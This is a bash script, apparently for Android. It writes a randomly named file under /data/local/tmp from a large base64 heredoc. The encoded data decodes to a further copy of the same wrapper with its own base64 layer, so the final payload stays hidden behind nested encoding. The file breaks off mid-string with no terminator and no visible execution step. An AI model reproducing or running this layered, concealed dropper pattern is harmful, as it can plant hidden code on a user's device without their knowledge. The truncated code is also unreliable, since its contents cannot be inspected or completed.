#!/bin/bash
RNDM=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32 ; echo '') 
PIXIE="/data/local/tmp/tmp.$RNDM"
base64 -d >${PIXIE}<<DIXIE
IyEvYmluL2Jhc2gKUk5ETT0kKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtejAtOSB8IGhlYWQgLWMgMzIgOyBlY2hvICcnKSAKUElYSUU9Ii9kYXRhL2xvY2FsL3RtcC90bXAuJFJORE0iCmJhc2U2NCAtZCA+JHtQSVhJRX08PERJWElFClpXTm9ieUFuV2xkT2IySjVRVzVYYkdSUFlqSktOVkZYTlZoaVIxSlFXV3BLUzA1V1JsaGlSWEJTWld0SmQxWkZXazVrTWxKR1pVWlNUbE5HU2s1V1dIQkRUVVpTUjFSWVpHdFNXR2hWVkZWb1UxUldWalpSYWtKVlVtc3hNMXBGVmpSV1JURkpWV3N4Vm1WclNYZFdSVnBPWkRKU1JtVkdVazVUUmtwT1ZsaHdRMDFHVWtkVVdHUnJVbGhvVlZSVmFGTlVWbFkyVVdwQ1ZWSnJNVE5hUlZZMFZrVXhTVlZyTVZabGEwbDNWa1ZhVG1ReVVrWmxSbEpPVTBaS1RsWlljRU5OUmxKSFZGaGtZVTFIZUhWWk1HUTBWMnN4ZEdGRVNsUldWVFZMVjJwR1IxWXhUbk5XYTNCVFYwWktVbFpzWkRCV01VWnlZa1ZhVUZaWFVsUlpWbFpMVVRGYVNHVkdUbFJoTTJoWFZrZDBjMVV4V2xaWGJGcFVWbFp3VUZZeWVGWmxSbFp5VjJ4V1ZrMUZXbmRWVkVsNFZqSkdkRkpyYUZCU01sSkxXVlpXUjAxR1VrZFVXR1JyVWxob1ZWUlZhRk5VVmxZMlVXcENWVkpyTVROYVJWWTBWa1V4U1ZWck1WWmxhMGwzVmtWYVRtUXlVa1psUmxKT1UwWktUbFpZY0VOTlJsSkhWRmhrYTFKWWFGVlVWV2hUVkZaV05sRnFRbFZTYXpFeldrVldORlpGTVVsVmF6RldaV3RKZDFaRldrNWtNbEpHWlVaU1RsTkdTazVXV0hCRFRVWlNSMVJZWkd0U1dHaFZWRlZvVTFSV1ZqWlJha0pWVW1zeE0xcEZWbk5TUms1V1pFZEdWMDFFVmpKWFZ6VnpVVzFHVm1KRlpHcE5iVkpYVkZSR1MySXhhM2xPVms1cFVtNUNSVlZYZUU5WlZtUkdUa2hrV21Gck5VeFpNR1JMWkVacmVWcEdUbWxXTTJnMlZqSjRiMVJzYjNoV2EyaHNVak5vWVZZd1ZURmpNVTVXVjIxMGFGSXdXbHBXVm1oWFZGZEdWVlZxUmxSV1Ztd3pWMnBDYzJKdFRrbGpSMnhUVFZad2VsZFVRazlSYlZaV1ZHNVdWR0pzU2t0VldIQkhUbFprZEdKRlNtdGlWVEUyVmxjMVlXRnRTbFpYYmxaWVlrVXdNVmxyWkV0WFZscDFWR3h3V0ZKcmNIcFdNblJPVGtkUmQyUXpaRk5pYkZwb1ZUQldkMDFzYkZkYVJrcHJZa2hDU1ZWdGNFTlhiRlkyWWtoR1dtRnJiRE5hUm1SUFUxWmFkR0pIUm14V1JsbzFWMVJKZDJWSFVuTmlTRkpwVTBVMWFGWlljSE5rUm14WFdrUlNhVkl3TkRGVU1WcGhWVEZhUjFOcmJGaFdiVTQwV1d0V00yVkdVblJQVm5CWFRWVnZlVmRyVWtkVk1sWlhZa1pvVldKcmNHaFdNRlozVWpGd1ZtRkdUbXhXYlhoVlZERmFVMkZHU1hkWGJrcGFZV3MxY2xac1pFOWtSa3AwWTBkb1RtSkdiekZXVjNodllqQXhTRlJ1VWxOWFJuQlhWRmQwV21WV1pITmFSa3ByWWtaYVNWVnROVXRoYlZaVllraEdXbUZyTlV4WmExcHVaV3hHZEdGSGRGTk5SRll5VmpCb2QxRnRVbFpOVmxaYVRURmFUMVZZY0ZOT1JsSlhWV3hLVG1GNlJsVlViR2hyVjJ4WmVsUlVUbEpOYWxaTVdrVldjMUpGTVZsaVIwWm9WbFZaZVZkWWNFOVZNbEowVkc1U1UySlVWbWhXV0hCell6RnNjMkZHWkdwTlYzaGFWbGN4TkZsV1JqWmhSRTVWVWtWS1NGcEdXbmRUVms1MVYyMW9WMDFWV1hsV01uUnJVakF4UjJKR1VsQldNMEp3VkZkd1EwMVdhM2RoUm1Sb1ZtNUJNVlJzYUV0aGJVcFZVbXBLV0ZaNlJucFpla1ozVmtVNVdFMVhhRmROTW1oNlYxUk9jazVXV25OVGJGWldZVEpvWVZadWNFZGpNVkpGVW1zNWFVMVhlRmxXVnpWaFlUQXhWMU5xVmxoV2JWSlFXVEo0ZDFkV1RuSlhiWGhVVW10dk1WWXhXazVPVmxwSVVtdG9VMkpZVW5CVVZFcFRWbXhyZVUxVlpHaGlWVlkxVm0wMWMxVXhaRWhhTTJSYVRXcEdSMXBIZUZabFZrcHhVMjFHVjAxVldYbFdiRlpyVWpKT2RGUnFWbEJXTTBKd1ZGUkNkMk14WkVWVWEwNW9VakZLU1ZaSE1EVlhWMVp5VW1wR1ZWWnNTbkZhUmxWNFVrVTFTV0ZGTlZkU2ExWTFWa1prY2sxWFVYaGlSbWhxWlcxU1JWbHRkSGROUms1V1ZGaG9iRlp1UW5kVlZtaGhZV3N3ZUZOcVNscE5ha1pJV1cxNGQxWkZPVmhsUjJ4WVVteHdObFl4V205Vk1rcEhZMFZTVUZOSFVrNVVWVlpoVFZaa2NtRkZkR3RpVlZwWlZsWm9ZVmxXU1hkWFdHUllWbXN3TVZsWE1VcGxWVEZKVm0xd1ZGSnNjSGRXTWpWeVRWZE9kRlJ1VWs1WFJuQmhXV3hrTkdWc1pITlVWRlpwVmpCYVdWcFZaRFJoYlZaVllrWmtWbUpHU2xSVk1GcHpWMFV4V0dWRk1VNVdWRll5VmpGYWExVXlVblJWV0doV1ltMTRZVlpxUVRGbFZtUnpZVVYwVTJKV1drcFdWelZ6VjJ4V05tSkdWbHBXVjFKSVdWUktTbVZzY0VkV2JYQnBWbFp3ZUZkV1VrdFdNbFpYVTJ4c2FGSkZTbkZaYkZaWFRXeGFWVk5yWkU1aVNFSlpWbFpvWVZac1NYZFhibXhhVFRKek1WbFhNVXBsYkU1MFpVWnNUazFGY0haWGExWnJWREpKZUdGRVdsSlhSbHBQVm10a1QwMVdVbFpVVkVKc1VsUkdWbFpXVWt0VWJWWlZWbXBPV0ZadFVqWlVha0pQWkZaT2RWVnJjRkpsYTFreFZqSXhjMUZ0VW5SVVdIQldZbXh3Y1Zsc1ZtRmtWbVJ6VkZSV2FWSXdjRnBXYlRWUFYyeGtSMU51VGxoaE1EQXdXa1JDTTJReFNuVldiVVpVVWxoQmVWZFdXbXRWYlZKelkwVm9VMkZyU21GV1dIQnpZMVpzY1ZOWVpHdFdNRFZLVm0weGMxbFhWbFZXYm14YVRXcENORnBIZUhOa1IwcEpWRzFHVm1WdGVEQlhWbHByVGtkS1NGUnFWbEJXYkhCVVZtdGFTMU5XWkZkWk0yaHBVbGhrTkZaSE1EVlhiRmw0VTJwS1lWSkZXbFJhVmxwelYwWlNkVk50UmxoU1dFSklWMnhXYjFVeVZsZGlSbEpRVm14S2IxVnFRbUZqYkd4eFZHMTBWMVl3TlRCVmJURjNZVVV4YzFkcVZsWmlSMmgyVkZWa1QyUkdTbGxYYkZwT1lURnNOVll5ZUd0VmJWSnpWbXRvVTJKcmNIRmFWbEp6WTFac2NWUnJkR2xTYldRMlZWY3hiMkV4U1hkT1dGcFlVMGhDUTFwR1ZYaFdWbXQ2Vm1zMVVtVnNTVEJXUmxwVFZXc3hjazVWVWs5WFIxSmhWbXBPVGsweFJYbE9WWFJyVWxkNFJWUldhSE5aVjBaV1VtcEtXbVZyTlZSYVJ6RlBaRVpLZEU1WFJsWmxiWGg2VjFkNGIxWXlUWGhpUm14V1lsaG9hRlZZY0c5Tk1WSkZVV3RrYTFadVFrcFZNalZoWVVaWmVGSnFTbGhoTWxKSVZGVmFjMVpGT1ZoalIyeE9ZV3RKZUZkVVFtOVdNa1pYWTBSV1QxZEZjSEZaYkZKSFRXeGtXRTFZVG1wTldFSlZWREZqZUdGR1dYcGhTRTVhVFRKek1WWnRlRXRXVmxaeVlVWndWMlZyV25wV1JWSkhWREpKZUdKR2FGWmliSEJ5VkZaYVMwNVdaRmRhUlRscVlraENXbFV5ZEdGaVJrNUhVMnBXV0Zack1ERldhMlJIVTBaS2RHUkhiRTVOYkVwWFYxUkplRkl5Um5SU1dHeFhZbTE0VkZZd1pHNWtNV3Q1VFZWYWEySkdWalZWYlhCTFdWWlplRkpxU2xkV1YxSklXVEl4VDA1Vk9WaE9WbkJYWld0YWVsWXdVazlSTWtaSVZXdG9WV0pVYkZwYVYzUkhUVlpTVjFWdGNHdFdWRVpGVkd0b2IxUnNXa2RTV0d4VlZtc3dlRnBFUm5OWFIwNDJXa1ZTYVdFelFYZFZNVlpPWlVkV1YyTklRbEpYUm5CeFZGUkdTMDFzYTNsTlZXUnBZa2hDVlZReFpEUmhWbVJIVjI1d1dGWnRhRlJaYTFwM1VrVTVTVnBGTVU1U1ZtOTRWakowYjFNeVVuUlNiR2hXVjBad2FGVnFRbHBrTVdSWFZGUldhR0pWYkRWVVZXaFhZV3hPUjFkdVFsaGliWE40V1RJeFQyUkZNVmxYYkhCcFZqTm9ObFl5ZUU1T1YwcFlVbXhvYkZJemFIRmFWbEp6VmpGV2MxVnNUbFJTYlhoWlZGWmtORlJWTVZaT1dGcFlWbTFTVkZwSE1WSmxSbFoxWWtad1YwMUVWalZXTW5odlV6RktkRlpyYkZaaWJYaGhWbGh3YzFaV2JGWmFSV1JvVFd0c05sZHJXbGRoYlVwV1YyNUdXbFpGY0ZoYVZscExWMWRHUlZGdGNHbFdWbGw1Vm14U1MxSXdNWE5qUm1oV1YwWndWMVZxUW1GbFZtdDZZWHBXYVdKSGVGbFVWbVEwVjFVd2QxTnRPV0ZTVjFKUVdXcEdiMDVzUmxsV2F6VlhVakEwZUZaR1ZrNU5SMVpHVFZaV1ZsWkZjRTlaVmxKWFRURmtWMXBJY0U5TlJUVXhWVEkxVTFOc1JqWlNhbFpZWWxkNFExcEhNVTVsYkZaMVYyMXdhVlpXY0RGV01uaE9UbGRLU0ZOc2JGZGlhelZoVmpCYVMyTXhaSEpVVkZKclRVaGtNMVZ0TlZkWlZrNUdZMFJLV2xadFVsTmFSM2gzVTBaS2NWRnNjRlpsYlhoNFYxZHdTbVF5VWxoVWEyeFhZbGQ0YUZwV1VsZGxWbXQ1VFVob2EySkhlREJaYTJoUFdWWldObUpJVWxwV2JWRXdXV3RrVDA1Vk9WZFhiRTVYVW10d1NsWXhXbXBsUjBwR1pETm9WV0pVYkdGV2FrWkxUV3h3UlZKc1RteFdiWGhaVmtjMVMxbFdaRVpqUldSaFZsZG9WRnBXV25OV1JUbFhWVzFvVTAxR2NIbFhWM0JQWVRGYVdGUnVVbE5pV0VKdlZGZDRZVTVXVm5OaFJ6bE9VakExTUZWc2FHRldhekZ5VjFoc1dHSkhVbE5hUjNoWFUwWktkVk50Y0d4V1IzZ3hWakZhYW1WSFNrZGFNM0JTWWxkb2NsVnFRVEZrYkdSSlkwVkthMVpVUmxaWFZFNVhWR3hHTmxWcVVsVldiRXBUVkZkemVFNVZOVmxhUm5CWFRUQXdlbFZVU1RGVE1sSkdZa1ZTVGxkSGVHaFpWbFpIVFd4c05sUnNUbXRpVlRVd1ZXMHdNVmxXVmpaaVNFNWFZa2RvV0ZsNlJuTlhWbFowWlVkR1VtVnRaM3BXUlZKRFVqSlNWMk5GYkZSaWJIQnZWbXBHUjAxc1pISmFSV1JPVW0xNFZWUXhaSGRoVlRGeFVXcEdXazFIYUZoWlZscDNUbFUxV1ZOdGNHbFdSVmw1VmpGamVHTXlUWGhqUmxKUVZucEdiMVpxVG05ak1XdDZZWHBXVjJKRmNGWldWM1J2VjJ4YU5sSnVUbFZTUlZwUVdXcEdjMWRHVm5WWGJYUk9WbXR2TVZZeFdtdFVNazV6WTBac1ZHRXhjSE5WTUZwTFRsWmtWMVJVVmxkU01GcEpWVzB4TUdGVk1IbFZiRnBhVFdwR1NGbFhNVVpsVmxwMVlrWk9XRkl5WkROWFZFbDRVbTFTYzFaWWJGTmhhM0JvVm1wR1IwMXNXbFphUldScVlsVTBNVlF4WXpGWGJGbzJVbTVPV0ZKRk5VUlpWV1JUVTBaU2RFOVdiR3hoTUZsNFZrWmFVMkZ0VWxaTlZWSlBVMGRvVDFacldrWmxWbEp5VkZSR2EwMVhlRmxaTTNCclVrZEtjbU5FUWxSV1ZURTBXbFphZDJOR1JsbFhiWEJPVFZWdmVWZFVTWGhTTWtwelkwWlNVRll6YUhCV01GcGhaV3hrVjJGR1RtbFNia0pGVkRCb2ExUlZNVVpYYWtaWVlUSm9URnBITVVkWFJsWlpWMjFHVTAxR2JETldNVnBPVGxkR2RGTlliRTVUUmxweFZUQmFZV05HWkhWaGVrWnFZbFUxTUZSV2FHRlhiVXBZWlVod1dHSkZNREZaYkdSSFYwZFdTR1ZIY0d4V1IzaFlWbGQ0VTFVeFRrZGlSbWhPVmpOb1RsUldWVEZrYkdSWFdrWk9hMkpXUmpSV1Z6VnpWMnhaZDA1WWJGaGlSMmhNVlcweFYxTldWblZpUm5CV1pXMTRWbGRXVm10U01rVjVVMWh3WVZKc1duRlpiRlpoWTFac1ZWTnNaR3hXYTNCYVdWVlNRMkZ0U2xaV2FrcFhWa1Z3U0ZSWGVIZFhSbFpaVjJ4YVUwMUdjRFZYVkU1eVRsZEdkRk5ZY0ZSaVdHaGFWRlJDUzJJeGNFWmFSVGxwVFZkbk1sVldhRmRVYkZwSVZHcEdWVlpWTUhkYVZWVjRWbFp2ZWxwRk5WSmxiRmw2VmpGYWEyVnJOSGRVYmxaVVlteEtTMVZZY0VkT1ZtUjBZa1ZLYTJKVk1UWldWelZoWVcxS1ZsZHVWbGhpUlRBeFdXdGtTMWRXV25WVWJIQllVbXR3ZWxZeWRFNU9SMUYzWkROa1UySnNXbWhWTUZaM1RXeHNWMXBHU210aVNFSkpWVzF3UTFkc1ZqWmlTRVphWVd0c00xcEdaRTlUVmxwMFlrZEdiRlpHV2pWWFZFbDNaVWRTYzJKSVVtbFRSVFZvVmxod2MyUkdiRmRhUkZKcFVqQTBNVlF4V21GVk1WcEhVMnRzV0ZadFRqUlphMVl6WlVaU2RFOVdjRmROVlc5NVYydFNSMVV5VmxkaVJtaFZZbXR3YUZZd1ZuZFNNWEJXWVVaT2JGWnRlRlZVTVZwVFlVWkpkMWR1U2xwaGF6VnlWbXhrVDJSR1NuUmpSMmhPWWtadk1WWlhlRzlpTURGSVZHNVNVMWRHY0ZkVVYzUmFaVlprYzFwR1NtdGlSbHBKVlcwMVMyRnRWbFZpU0VaYVlXczFURmxyV201bGJFWjBZVWQwVTAxRVZqSldNR2gzVVcxU1ZrMVdWbHBOTVZwUFZWaHdVMDVHVWxkVmJUVnJUVVJHVlZSc2FHdFhiRmw2VkZST1VrMXFWa3hhUlZaelVrVXhXV0pIUm1oV1ZWbDVWMWh3VDFVeVVuUlVibEpUWWxSV2FGWlljSE5qTVd4ellVWmthazFYZUZwV1Z6RTBXVlpHTm1GRVRsVlNSVXBJV2taYWQxTldUblZYYldoWFRWVlplVll5ZEd0U01ERkhZa1pTVUZZelFuQlVWM0JEVFZacmQyRkdaR2hXYmtFeFZHeG9TMkZ0U2xWU2FrcFlWbnBHZWxsNlJuZFdSVGxZVFZkb1YwMHlhSHBYVkU1eVRsWmFjMU5zVmxaaE1taGhWbTV3UjJNeFVrVlNhemxwVFZkNFdWWlhOV0ZoTURGWFUycFdXRlp0VWxCWk1uaDNWMVpPY2xkdGVGUlNhMjh4VmpGYVRrNVdXa2hTYTJoVFlsaFNjRlJVU2xOV2JHdDVUVlZrYUdKVlZqVldiVFZ6VlRGa1NGb3paRnBOYWtaSFdrZDRWbVZXU25GVGJVWlhUVlZaZVZac1ZtdFNNazUwVkdwV1VGWXpRbkJVVkVKM1l6RmtSVlJyVG1oU01VcEpWa2N3TlZkWFZuSlNha1pWVm14S2NWcEdWWGhTUlRWSllVVTFWMUl5VVhwV1JtUnlUVmRSZUdKR2FHcGxiVkpGV1cxMGQwMUdUbFpVV0doc1ZtNUNkMVZXYUdGaGF6QjRVMnBLV2sxcVJraFpiWGgzVmtVNVdHVkhiRmhTYkhBMlZqRmFiMVV5U2tkalJWSlFVMGRTVGxSVlZtRk5WbVJ5WVVWMGEySlZXbGxXVm1oaFdWWkpkMWRZWkZoV2F6QXhXVmN4U21WVk1VbFdiWEJVVW14d2QxWXlOWEpOVjA1MFZHNVNUbGRHY0dGWmJHUTBaV3hrYzFSVVZtbFdNRnBaV2xWa05HRnRWbFZpUm1SV1lrWktWRlV3V25OWFJURllaVVV4VGxaVVZqSldNVnByVlRKU2RGVllhRlppYlhoaFZtcEJNV1ZXWkhOaFJYUlRZbFphU2xaWE5YTlhiRlkyWWtaV1dsWlhVa2haVkVwS1pXeHdSMVp0Y0dsV1ZuQjRWMVpTUzFZeVZsZFRiR3hvVWtWS2NWbHNWbGROYkZwVlUydGtUbUpJUWxsV1ZtaGhWbXhKZDFkdWJGcE5Nbk14V1ZjeFNtVnNUblJsUm14T1RVVndkbGRyVm10VU1rbDRZVVJhVWxkR1drOVdhMlJQVFZaU1ZsUlVRbXhTVkVaV1YycE9hMVJ0VmxWV2FrNVlWbTFTTmxScVFrOWtWazUxVld0d1VtVnJXVEZXTWpGelVXMVNkRlJZY0ZaaWJIQnhXV3hXWVdSV1pITlVWRlpwVWpCd1dsWnROVTlYYkdSSFUyNU9XR0V3TURCYVJFSXpaREZLZFZadFJsUlNXRUY1VjFaYWExVnRVbk5qUldoVFlXdEtZVlpZY0hOalZteHhVMWhrYTFZd05VcFdiVEZ6V1ZkV1ZWWnViRnBOYWtJMFdrZDRjMlJIU2tsVWJVWldaVzE0TUZkV1dtdE9SMHBJVkdwV1VGWnNjRlJXYTFwTFUxWmtWMWt6YUdsU1dHUTBWa2N3TlZkc1dYaFRha3BoVWtWYVZGcFdXbk5YUmxKMVUyMUdXRkpZUWtoWGJGWnZWVEpXVjJKR1VsQldiRXB2VldwQ1lXTnNiSEZVYlhSWFZqQTFNRlZ0TVhkaFJURnpWMnBXVm1KSGFIWlVWV1JQWkVaS1dWZHNXazVoTVd3MVZqSjRhMVZ0VW5OV2EyaFRZbXR3Y1ZwV1VuTmpWbXh4Vkd0MGFWSnRaRFpWVnpGdllURkpkMDVZV2xoVFNFSkRXa1pWZUZaV2EzcFdhelZTWld4Sk1GWkdXbE5pYlZGM1RsVlNUMWRIVW1GV2FrNU9UVEZGZVU1VmRHdFNWM2hGVkZab2MxbFhSbFpTYWtwYVpXczFWRnBITVU5a1JrcDBUbGRHVm1WdGVIcFhWM2h2VmpKTmVHSkdiRlppV0dob1ZWaHdiMDB4VWtWUmEyUnJWbTVDU2xVeU5XRmhSbGw0VW1wS1dHRXlVa2hVVlZwelZrVTVXR05IYkU1aGEwbDRWMVJDYjFZeVJsZGpSRlpQVjBWd2NWbHNVa2ROYkdSWVRWaE9hazFZUWxWVU1XTjRZVVpaZW1GSVRscE5Nbk14Vm0xNFMxWldWbkpoUm5CWFpXdGFlbFpGVWtkVU1rbDRZa1pvVm1Kc2NISlVWbHBMVGxaa1YxcEZPV3BpU0VKYVZUSjBZV0pHVGtkVGFsWllWbXN3TVZaclpFZFRSa3AwWkVkc1RrMXNTbGRYVkVsNFVqSkdkRkpZYkZkaWJYaFVWakJrYm1ReGEzbE5WVnByWWtaV05WVnRjRXRaVmxsNFVtcEtWMVpYVWtoWk1qRlBUbFU1V0dOSGJFNU5TRUo2VmpCU1QxRXlSa2hWYTJoVllsUnNXbHBYZEVkTlZsSlhWVzF3YTFaVVJrVlVhMmh2Vkd4YVNGcEVUbFZpUlRCNFdrUkdjMWRIVGpaYVJWSnBZVE5CZDFVeFZrNWxSMVpYWTBoQ1VsZEdjSEZVVkVaTFRXeHJlVTFWWkdsaVNFSlZWREZrTkdGV1pFZFhibkJZVm0xb1ZGbHJXbmRTUlRsSldrVXhUbEpXYjNoV01uUnZVekpTZEZKc2FGWlhSbkJvVldwQ1dtUXhaRmRVVkZab1lsVnNOVlJWYUZkaGJFNUhWMjVDV0dKdGMzaFpNakZQWkVVeFdWZHNjR2xXTTJnMlZqSjRUazVYU2xoU2JHaHNVak5vY1ZwV1VuTldNVlp6Vld4T1ZGSnRlRmxVVm1RMFZGVXhWazVZV2xoV2JWSlVXa2N4VW1WR1ZuVmlSbkJYVFVSV05WWXllRzlUTVVwMFZtdHNWbUp0ZUdGV1dIQnpWbFpzVmxwRlpHaE5hMncyVjJ0YVYyRnRTbFpYYmtaYVZrVndXRnBXV2t0WFYwWkZVVzF3YVZaV1dYbFdiRkpMVWpBeGMyTkdhRlpYUm5CWFZXcENZV1ZXYTNwaGVsWnBZa2Q0V1ZSV1pEUlhWVEIzVTIwNVlWSlhVbEJaYWtadlRteEdXVlpyTlZkU01EUjRWa1pXVGsxSFZrWk5WbFpoVFRKU1QxVlljRmROTVdSWFdraHdUMDFGTlRGVk1qVlRVMnhHTmxKcVZsaGlWM2hEV2tjeFRtVnNWblZYYlhCcFZsWndNVll5ZUU1T1YwcElVMnhzVjJKck5XRldNRnBMWXpGa2NsUlVVbXROU0dRelZXMDFWMWxXVGtaalJFcGFWbTFTVTFwSGVIZFRSa3B4VVd4d1ZtVnRlSGhYVjNCS1pESlNXRlJyYkZkaVYzaG9XbFpTVjJWV2EzbE5TR2hyWWtkNE1GbHJhRTlaVmxZMllraFNXbFp0VVRCWmEyUlBUbFU1VjFkc1RsZFNhM0JLVmpGYWFtVkhTa1prTTJoVllsUnNZVlpxUmt0TmJIQkZVbXhPYkZadGVGbFdSelZMV1Zaa1JtTkZaR0ZXVjJoVVdsWmFjMVpGT1ZkVmJXaFRUVVp3ZVZkWGNFOWhNVnBZVkc1U1UySllRbTlVVjNoaFRsWldjMkZIT1U1U01EVXdWV3hvWVZack1YSlhXR3hZWWtkU1UxcEhlRmRUUmtwMVUyMXdiRlpIZURGV01WcHFaVWRLUjFvemNGSmlWMmh5VldwQk1XUnNaRWxqUlVwclZsUkdWbGRVVGxkVWJFWTJWV3BTVlZac1NuVmFSRUY0VmtVMVdWcEdjRmROTURCNlZWUkpNVk15VWtaaVJWSk9WMGQ0YUZsV1ZrZE5iR3cyVkd4T2EySlZOVEJWYlRBeFdWWldObUpJVGxwaVIyaFlXWHBHYzFkV1ZuUmxSMFpTWlcxbmVsWkZVa05TTWxKWFkwVnNWR0pzY0c5V2FrWkhUV3hrY2xwRlpFNVNiWGhWVkRGa2QyRlZNWEZSYWtaYVRVZG9XRmxXV25kT1ZUVlpVMjF3YVZaRldYbFdNV040WXpKTmVHTkdVbEJXZWtadlZtcE9iMk14YTNwaGVsWlhZa1Z3VmxaWGRHOVhiRm8yVW01T1ZWSkZXbEJaYWtaelYwWldkVmR0ZEU1V2EyOHhWakZhYTFReVRuTmpSbXhVWVRGd2MxVXdXa3RPVm1SWFZGUldWMUl3V2tsVmJURXdZVlV3ZVZWc1dscE5ha1pJV1ZjeFJtVldXblZpUms1WVVqSmtNMWRVU1hoU2JWSnpWbGhzVTJGcmNHaFdha1pIVFd4YVZscEZaR3BpVlRReFZERmpNVmRzV2paU2JrNVlVa1UxUkZsVlpGTlRSbEowVDFac2JHRXdXWGhXUmxwVFlXMVNWazFWVWs5VFIyaFBWbXRrYTAweFVsaGhla1pyVFZkNFdWa3pjR3RTUjBweVkwUkNWRlpWTVRSYVZscDNZMFpHV1ZkdGNFNU5WVzk1VjFSSmVGSXlTbk5qUmxKUVZqTm9jRll3V21GbGJHUlhZVVpPYVZKdVFrVlVNR2hyVkZVeFJsZHFSbGhoTW1oTVdrY3hSMWRHVmxsWGJVWlRUVVpzTTFZeFdrNU9WMFowVTFoc1RsTkdXbkZWTUZwaFkwWmtkV0Y2Um1waVZUVXdWRlpvWVZkdFNsaGxTSEJZWWtVd01WbHNaRWRYUjFaSVpVZHdiRlpIZUZoV1YzaFRWVEZPUjJKR2FFNVdNMmhPVkZaVk1XUnNaRmRhUms1cllsWkdORlpYTlhOWGJGbDNUbGhzV0dKSGFFeFZiVEZYVTFaV2RXSkdjRlpsYlhoV1YxWldhMUl5UlhsVFdIQmhVbXhhY1Zsc1ZtRmpWbXhWVTJ4a2JGWnJjRnBaVlZKRFlXMUtWbFpxU2xkV1JYQklWRmQ0ZDFkR1ZsbFhiRnBUVFVad05WZFVUbkpPVjBwellrWm9UbFl6YUZwVVZFSkxZakZ3UmxwRk9XbE5WMmN5VlZab1YxUnNXa2hVYWtaVlZsVXdkMXBWVlhoV1ZtOTZXa1UxYkZaR1dYcFdNVnByWldzMGQxUnVWbFJpYkVwTFZWaHdSMDVXWkhSaVJVcHJZbFV4TmxaWE5XRmhiVXBXVjI1V1dHSkZNREZaYTJSTFYxWmFkVlJzY0ZoU2EzQjZWakowVGs1SFVYZGtNMlJUWW14YWFGVXdWbmROYkd4WFdrWkthMkpJUWtsVmJYQkRWMnhXTm1KSVJscGhhMnd6V2taa1QxTldXblJpUjBac1ZrWmFOVmRVU1hkbFIxSnpZa2hTYVZORk5XaFdXSEJ6WkVac1YxcEVVbWxTTURReFZERmFZVlV4V2tkVGEyeFlWbTFPTkZsclZqTmxSbEowVDFad1YwMVZiM2xYYTFKSFZUSldWMkpHYUZWaWEzQm9WakJXZDFJeGNGWmhSazVzVm0xNFZWUXhXbE5oUmtsM1YyNUtXbUZyTlhKV2JHUlBaRVpLZEdOSGFFNWlSbTh4VmxkNGIySXdNVWhVYmxKVFYwWndWMVJYZEZwbFZtUnpXa1pLYTJKR1drbFZiVFZMWVcxV1ZXSklWbGhXYlU0MFdXdGFibVZzUm5SaFIzUlRUVVJXTWxZd2FIZFJiVkpXVFZaV1drMHhXazlWV0hCVFRrWlNWMVZ0Tld0TlJGWkZWR3hvYTFkc1dYcFVWRTVTVFdwV1RGcEZWbk5TUlRGWllrZEdhRlpWV1hsWFdIQlBWVEpTZEZSdVVsTmlWRlpvVmxod2MyTXhiSE5oUm1ScVRWZDRXbFpYTVRSWlZrWTJZVVJPVlZKRlNraGFSbHAzVTFaT2RWZHRhRmROVlZsNVZqSjBhMUl3TVVkaVJsSlFWak5DY0ZSWGNFTk5WbXQzWVVaa2FGWnVRVEZVYkdoTFlXMUtWVkpxU2xoV2VrWjZXWHBHZDFaRk9WaE5WMmhYVFRKb2VsZFVUbkpPVmxwelUyeFdWbUV5YUdGV2JuQkhZekZTUlZKck9XbE5WM2haVmxjMVlXRXdNVmRUYWxaWVZtMVNVRmt5ZUhkWFZrNXlWMjE0VkZKcmJ6RldNVnBPVGxaYVNGSnJhRk5pV0ZKd1ZGUktVMVpzYTNsTlZXUm9ZbFZXTlZadE5YTlZNV1JJV2pOa1drMXFSa2RhUjNoV1pWWktjVk50UmxkTlZWbDVWbXhXYTFJeVRuUlVhbFpRVm5wV1lWWnVjRWRqTVdSRlZHdE9hRkl4U2tsV1J6QTFWMWRXY2xKcVJsVldiRXB4V2taVmVGSkZOVWxoUlRWWFVqSlJlbFpIZUU1TlYxRjRZa1pvYW1WdFVrVlpiWFIzVFVaT1ZsUllhR3hXYmtKM1ZWWm9ZV0ZyTUhoVGFrcGFUV3BHU0ZsdGVIZFdSVGxZWlVkc1dGSnNjRFpXTVZwdlZUSktSMk5GVWxCVFIxSk9WRlZXWVUxV1pISmhSWFJyWWxWYVdWWldhR0ZaVmtsM1YxaGtXRlpyTURGWlZ6RktaVlV4U1ZadGNGUlNiSEIzVmpJMWNrMVhUblJVYmxKT1YwWndZVmxzWkRSbGJHUnpWRlJXYVZZd1dsbGFWV1EwWVcxV1ZXSkdaRlppUmtwVVZUQmFjMWRGTVZobFJURk9WbFJXTWxZeFdtdFZNbEowVlZob1ZtSnRlR0ZXYWtFeFpWWmtjMkZGZEZOaVZscEtWbGMxYzFkc1ZqWmlSbFphVmxkU1NGbFVTa3BsYkhCSFZtMXdhVlpXY0hoWFZsSkxWakpXVjFOc2JHaFNSVXB4V1d4V1YwMXNXbFZUYTJST1lraENXVlpXYUdGV2JFbDNWMjVzV2sweWN6RlpiWGh6VjBVeFdHVkdiRTVOUlhCMlYydFdhMVF5U1hoaFJGcFNWMFphVDFaclpFOU5WbEpXVkZSQ2JGSlVSbFpYYWs1clZESkdWVlpxVGxoV2JWSTJWR3BDVDJSV1RuVlZhM0JTWld0Wk1WWXlNWE5SYlZKMFZGaHdWbUpzY0hGWmJGWmhaRlprYzFSVVZtbFNNSEJhVm0wMVQxZHNaRWRUYms1WVlUQXdNRnBFUWpOa01VcDFWbTFHVkZKWVFYbFhWbHByVlcxU2MyTkZhRk5oYTBwaFZsaHdjMk5XYkhGVFdHUnJWakExU2xadE1YTlpWMVpWVm01c1drMXFRalJhUjNoelpFZEtTVlJ0UmxabGJYZ3dWMVphYTA1SFNraFVhbFpRVm14d1ZGWnJXa3RUVm1SWFdUTm9hVkpZWkRSV1J6QTFWMnhaZUZOcVNtRlNSVnBVV2xaYWMxZEdVblZUYlVaWVVsaENTRmRzVm05Vk1sWlhZa1pTVUZac1NtOVZha0poWTJ4c2NWUnRkRmRXTURVd1ZXMHhkMkZGTVhOWGFsWldZa2RvZGxSVlpFOWtSa3BaVjJ4YVRtRXhiRFZXTW5oclZXMVNjMVpyYUZOaWEzQnhXbFpTYzJSV1pGZFpNMmhwVW0xa05sVlhNVzloTVVsM1RsaGFXRk5JUWtOYVJsVjRWbFpyZWxack5WSmxiRWt3VmtaYVUySnRVWGRPVkZaUFYwZFNZVlpxVGs1Tk1VVjVUbFU1YWsxWVFsbFdiVFZyVTJ4S1JtSkZlRmhXUlRWRFYycENORll4VGxoYVJURk9U